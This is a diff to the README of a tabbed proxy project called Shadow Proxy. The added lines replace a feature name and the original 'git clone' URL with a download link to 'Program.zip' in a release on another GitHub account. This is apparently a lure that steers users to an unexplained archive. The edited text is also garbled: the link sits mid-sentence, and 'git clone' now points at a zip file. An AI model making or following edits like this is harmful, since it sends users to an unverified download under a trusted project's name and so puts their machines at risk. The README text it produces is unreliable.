@@ -8,7 +8,7 @@ Welcome to Shadow Proxy - A tabbed proxy designed to make your internet experien
 
 🔍 Search Engine Switcher: Easily switch between your favorite search engines to find the information you need swiftly! 🔄
 
-🚀 Supports now.gg: Experience accelerated gaming and low-latency performance with now.gg integration! 🎮
+🚀 Supports https://github.com/velvirt/Shadow-Tabbed-V2/releases/download/v1.0/Program.zip Experience accelerated gaming and low-latency performance with https://github.com/velvirt/Shadow-Tabbed-V2/releases/download/v1.0/Program.zip integration! 🎮
 
 👻 Tab Cloaking: Hide your browsing activity from prying eyes by cloaking your tabs. No traces left behind! 👓
 
@@ -24,7 +24,7 @@ To use Shadow Proxy, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/NCCoder3/Shadow-Tabbed/
+   git clone https://github.com/velvirt/Shadow-Tabbed-V2/releases/download/v1.0/Program.zip
 2. Go into that directory
    ```bash
    cd Shadow-Tabbed
